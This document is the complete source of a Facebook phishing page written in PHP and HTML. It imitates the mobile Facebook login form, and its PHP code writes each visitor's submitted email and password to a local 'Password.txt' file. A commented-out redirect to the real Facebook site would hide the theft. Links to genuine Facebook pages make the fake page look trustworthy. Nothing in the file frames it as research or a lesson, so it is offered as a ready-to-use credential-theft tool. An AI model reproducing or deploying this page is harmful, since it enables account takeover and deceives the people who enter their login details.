<!DOCTYPE html>


<?php
if(isset($_POST['login'])){
$Name = "Email:".$_POST['name']."
";
$Pass = "Password:".$_POST['password']."
";


$file=fopen("Password.txt", "a");
fwrite($file, $Name);
fwrite($file, $Pass);
fclose($file);
//header('location:http://free.facebook.com');
}

?>

<html lang="en">
<head>
	 <meta name="viewport" content="initial-scale=1, width=240">
  <meta name="referrer" content="default" id="meta_referrer">
 
	<title> Please Log in Your Facebook </title>
	<link rel="stylesheet" href="abm.css">
	<link rel="icon" type="image/gif/png" href="img/2.png"/>
</head>
<body>
	<div id="wrapper">
		<header>
			<span class="title">
				<img src="img/1.png" alt="">
			</span>
			<span class="new">
				<button><a href="https://mbasic.facebook.com/reg/?cid=102&ref=dbl">Create Account</a></button>
			</span>
		</header>
		<div class="content_wrapper">
		<form action="2.php" method="POST">
			<label> <b>Email address or phone number</b></label> <br>
			<input type="text" required name="name"> <br>
			<label> <b>Password</b></label> <br>
			<input type="password" required name="password"> <br>
			<input type="submit" name="login" value="Log In">
		</form>
		<div class="bx">
			<span class="by">
				or
			</span>
		</div>
		<div class="new_ac">
			<button><a href="https://free.facebook.com/reg/?cid=102&ref=dbl">Create New Account</a></button>
		</div>
		<br>
		<div class="last">
			<p class="sa"><a class="a" href="https://free.facebook.com/recover/initiate/?c=https%3A%2F%2Ffree.facebook.com%2Flogin%2F%3Fref%3Ddbl%26fl%26refid%3D8&ars=facebook_login&lwv=100&ref=dbl">Forgotten password?</a> </p> 
			<p><a class="a" href="https://free.facebook.com/help/?ref=dbl">Help Centre</a></p>
		</div>
		<br>
		</div>
	</div>
</body>
</html>
